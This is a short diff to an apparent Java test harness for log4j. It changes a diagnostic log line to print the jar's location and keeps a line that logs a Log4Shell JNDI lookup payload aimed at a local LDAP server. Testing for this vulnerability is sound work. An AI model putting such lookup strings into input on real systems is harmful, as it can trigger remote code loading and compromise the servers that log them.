@@ -9,7 +9,7 @@ public class log4j {
 
     public static void main(String[] args) {
         PropertyConfigurator.configure("log4j.properties");
-        logger.error(LogManager.class.getPackage().getImplementationVersion());
+        logger.error(LogManager.class.getProtectionDomain().getCodeSource().getLocation());
         logger.error("${jndi:ldap://127.0.0.1:1389/a}");
     }
 }
